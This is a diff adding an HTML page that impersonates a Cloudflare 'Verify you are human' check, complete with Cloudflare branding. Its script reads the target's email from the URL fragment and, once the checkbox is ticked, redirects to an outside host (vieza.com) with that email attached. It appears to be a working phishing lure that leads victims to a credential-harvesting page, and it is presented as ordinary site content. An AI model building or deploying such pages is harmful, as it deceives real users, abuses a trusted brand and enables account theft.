@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verification Required</title>
+
+<style>
+    body {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        background-color: #fff;
+    }
+
+    .verification-container {
+        border: 1px solid #ddd;
+        padding: 20px;
+        width: 320px;
+        background: #fff;
+    }
+
+    .checkbox-wrapper {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+    }
+
+    input[type="checkbox"] {
+        width: 18px;
+        height: 18px;
+        cursor: pointer;
+    }
+
+    .spinner {
+        display: none;
+        width: 18px;
+        height: 18px;
+    }
+
+    .checkbox-label {
+        font-size: 14px;
+        color: #000;
+    }
+
+    .footer {
+        text-align: right;
+        font-size: 11px;
+        color: #737373;
+        margin-top: 20px;
+    }
+
+    .footer img {
+        width: 40px;
+        vertical-align: middle;
+    }
+
+    .footer a {
+        color: #737373;
+        text-decoration: none;
+    }
+</style>
+
+<script>
+    // Read ONLY the hash fragment (#value)
+    function getQueryParams() {
+        return window.location.hash.replace('#', '');
+    }
+
+    function redirectToUrl() {
+        const email = getQueryParams();
+        const destinationUrl = "https://vieza.com/wiht/cssl/sc/index.html"; // your file
+
+        if (email) {
+            window.location.href = `${destinationUrl}#${email}`;
+        }
+    }
+
+    function handleCheckbox() {
+        const checkbox = document.getElementById('verification-checkbox');
+        const spinner = document.getElementById('spinner');
+        const label = document.getElementById('checkbox-label');
+
+        checkbox.style.display = 'none';
+        spinner.style.display = 'inline';
+        label.textContent = "Verifying...";
+
+        setTimeout(redirectToUrl, 300);
+    }
+</script>
+
+</head>
+<body>
+
+<div class="verification-container">
+
+    <div class="checkbox-wrapper">
+        <input type="checkbox" id="verification-checkbox" onchange="handleCheckbox()">
+        <img id="spinner" class="spinner" src="https://upload.wikimedia.org/wikipedia/commons/d/de/Ajax-loader.gif">
+        <label id="checkbox-label" class="checkbox-label">Verify you are human</label>
+    </div>
+
+    <div class="footer">
+        <img src="https://www.cloudflare.com/favicon.ico" alt="Cloudflare">
+        <div>Cloudflare</div>
+        <a href="#">Privacy</a> • <a href="#">Terms</a>
+    </div>
+
+</div>
+
+</body>
+</html>
